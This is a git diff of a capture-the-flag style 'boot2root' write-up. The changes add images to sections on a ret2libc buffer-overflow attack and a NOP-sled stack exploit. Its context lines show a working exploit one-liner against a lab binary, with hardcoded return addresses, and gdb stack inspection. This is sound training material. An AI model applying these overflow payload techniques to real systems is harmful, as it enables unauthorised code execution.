@@ -479,6 +479,11 @@ In order to exploit the buffer overflow, we also need to take the system archite
 
 In our case, we are gonna perform a so called `Ret2libC` attack.
 We need a function from the C standard library (LIBC) in order to perform the attack, which will be the `system()` in our case.
+
+<p align="center">
+  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/ret2libc.png">
+</p>
+
 This is the code which successfully exploits the buffer overflow in the `exploit_me` program:
 ```
 ./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
@@ -693,7 +698,9 @@ Inspect the stack pointer:
 ```
 (gdb) x/300wx $esp
 ```
-TODO: IMAGE STACK POINTER REGISTER
+<p align="center">
+  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup4/nop_slide.png">
+</p>
 
 The left-most column in this image contains the memory address of the stack pointer. By using it we will know the runtime memory addresses that contain the payload. This means we can pick an address somewhere in the NOP-sled for the return address to point to. In my case I went with `0xbffff8bc`. We will replace the improvised address `\x45\x45\x45\x45` with the new address and of course we need to change the address to a Payload write direction:
 ```
